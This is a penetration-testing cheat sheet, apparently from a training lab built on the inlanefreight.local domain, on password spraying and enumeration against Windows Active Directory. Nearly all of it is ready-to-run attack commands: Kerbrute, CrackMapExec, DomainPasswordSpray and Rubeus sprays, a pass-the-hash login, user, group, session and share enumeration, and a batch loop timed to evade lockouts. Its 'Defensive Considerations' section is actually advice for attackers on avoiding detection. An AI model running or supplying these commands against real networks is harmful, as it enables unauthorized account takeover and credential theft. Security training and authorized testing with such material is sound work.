# Password Spraying - Windows

## Password Spraying - Windows

Password spraying is a technique that attempts to access multiple accounts with a few commonly used passwords, helping avoid account lockouts while attempting to discover valid credentials.

### Internal Password Spraying - from Linux

#### Using Kerbrute for Password Spraying

Kerbrute uses Kerberos pre-authentication to perform password spraying with minimal risk of account lockouts.

```bash
# Basic password spray against a domain
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1

# With delay between attempts
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 -t 1 --delay 5 valid_users.txt Welcome1

# Specify specific domain controller
kerbrute passwordspray -d inlanefreight.local --dc dc01.inlanefreight.local valid_users.txt Welcome1
```

#### Using CrackMapExec (CME)

CrackMapExec is a versatile tool for testing credentials against multiple targets.

```bash
# Basic SMB password spray
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123

# Filter successful logins
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

# Test against specific domain
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 -d INLANEFREIGHT.LOCAL

# Test against subnet
sudo crackmapexec smb 172.16.5.0/24 -u valid_users.txt -p Password123

# Using local authentication
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

#### Validating Credentials with CrackMapExec

```bash
# Test a single credential pair
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123

# Test against multiple protocols
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
sudo crackmapexec winrm 172.16.5.5 -u avazquez -p Password123
sudo crackmapexec ssh 172.16.5.5 -u avazquez -p Password123
```

### Internal Password Spraying - from Windows

#### Using DomainPasswordSpray.ps1

DomainPasswordSpray is a PowerShell script for internal domain password spraying.

```powershell
# Import the module
Import-Module .\DomainPasswordSpray.ps1

# Basic password spray
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

# With specific user list
Invoke-DomainPasswordSpray -UserList users.txt -Password Welcome1 -OutFile spray_success

# With specific domain
Invoke-DomainPasswordSpray -Password Welcome1 -Domain inlanefreight.local -OutFile spray_success

# Perform a safe spray (check lockout policy first)
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -SafetyMargin 5
```

#### Using Rubeus

Rubeus can perform Kerberos-based password spraying.

```powershell
# Basic password spray
.\Rubeus.exe brute /password:Welcome1 /outfile:spray_results.txt

# With specific user list
.\Rubeus.exe brute /users:users.txt /password:Welcome1 /outfile:spray_results.txt

# With specific domain
.\Rubeus.exe brute /password:Welcome1 /domain:inlanefreight.local /outfile:spray_results.txt
```

### Enumeration with Valid Credentials

#### Domain User Enumeration with CME

```bash
# List all domain users and their properties
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users

# Get specific user info
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users | grep "Administrator"

# Check for users with badPwdCount=0
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users | grep "badPwdCount=0"
```

#### Domain Group Enumeration with CME

```bash
# List all domain groups
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups

# Get specific group info
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups | grep "Domain Admins"

# Get group members
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups --full
```

#### Session and Logged On User Enumeration

```bash
# List logged on users on a specific host
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users

# List logged on users across a subnet
sudo crackmapexec smb 172.16.5.0/24 -u forend -p Klmcargo2 --loggedon-users
```

#### Share Enumeration

```bash
# List available shares on a host
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares

# Recursively list share contents with spider_plus
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'

# Using SMBMap to check access
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5

# Recursive listing with SMBMap
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares'
```

### Password Spraying Strategy

#### Determining Lockout Policy

```powershell
# Using PowerView
Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess

# Using net accounts (cmd)
net accounts /domain
```

```bash
# Using CME
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --pass-pol
```

#### Building Target User Lists

```bash
# Extract valid user list with CME
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users | grep "badPwdCount=" | awk '{print $4}' > valid_users.txt

# Extract with ldapsearch
ldapsearch -x -h 172.16.5.5 -D "forend@inlanefreight.local" -w "Klmcargo2" -b "DC=inlanefreight,DC=local" "(&(objectClass=user)(objectCategory=person))" sAMAccountName | grep sAMAccountName | awk '{print $2}' > valid_users.txt
```

#### Batch Processing

```bash
# Divide user list into batches to avoid lockouts
split -l 10 valid_users.txt batch_

# Process each batch with delay between batches
for batch in batch_*; do
  sudo crackmapexec smb 172.16.5.5 -u $batch -p Welcome1
  echo "Waiting 30 minutes before next batch..."
  sleep 1800
done
```

### Defensive Considerations

1. **Account Lockout Policy**: Always check the domain's lockout policy before spraying
2. **Avoid Service Accounts**: Target only user accounts, avoiding service accounts that may trigger alerts
3. **Use Minimal Attempts**: Try only the most likely passwords to minimize failed login events
4. **Timing**: Space out attempts to stay under the lockout threshold
5. **Monitor for Lockouts**: Regularly check if any accounts are getting close to lockout
